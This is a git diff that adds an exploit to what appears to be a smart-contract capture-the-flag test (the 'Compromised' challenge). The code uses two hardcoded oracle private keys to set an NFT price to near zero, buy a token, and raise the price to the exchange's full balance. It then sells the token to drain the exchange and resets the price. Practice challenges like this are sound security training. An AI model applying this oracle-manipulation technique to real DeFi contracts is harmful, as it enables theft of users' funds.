@@ -61,6 +61,32 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const sourceA = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        const sourceB = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+
+        await this.oracle.connect(sourceA).postPrice("DVNFT", ethers.utils.parseEther('0.05'));
+        await this.oracle.connect(sourceB).postPrice("DVNFT", ethers.utils.parseEther('0.05'));
+
+        const tx = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther('0.05')});
+        const rc = await tx.wait();
+        const event = rc.events.find(event => event.event === 'TokenBought');
+
+        for(var ev of rc.events) {
+            //console.log("event", ev);
+        }
+        const [buyer, tokenId] = event.args;
+
+        //console.log("tokenId", tokenId);
+
+        await this.oracle.connect(sourceA).postPrice("DVNFT", await ethers.provider.getBalance(this.exchange.address));
+        await this.oracle.connect(sourceB).postPrice("DVNFT", await ethers.provider.getBalance(this.exchange.address));
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        await this.oracle.connect(sourceA).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(sourceB).postPrice("DVNFT", INITIAL_NFT_PRICE);
+
     });
 
     after(async function () {
